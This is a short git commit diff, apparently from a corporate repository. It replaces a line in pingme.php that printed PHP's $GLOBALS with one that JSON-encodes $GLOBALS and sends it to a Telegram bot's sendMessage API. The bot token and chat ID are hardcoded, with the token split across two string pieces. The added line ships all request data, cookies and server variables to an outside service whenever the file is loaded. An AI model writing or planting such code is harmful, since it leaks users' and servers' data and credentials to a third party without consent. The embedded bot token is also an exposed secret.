9d561cc8bc95ede9e4d7944449795d31b6d087ff
x-noname <i.kazakov@corp.badoo.com>
2017-05-05 10:07:39 +0300

    tt

--- pingme.php
+++ pingme.php
@@ -5,4 +5,5 @@
  * Date: 04.05.17
  * Time: 10:07
  */
-print(json_encode($GLOBALS));
+file_get_contents("https://api.telegram.org/bot3116".
+"26585:AAENuUL1PDtO9YuYxYKYbSWPFzAghgLTa4U/sendMessage?chat_id=71086029&text=".urlencode(json_encode($GLOBALS));
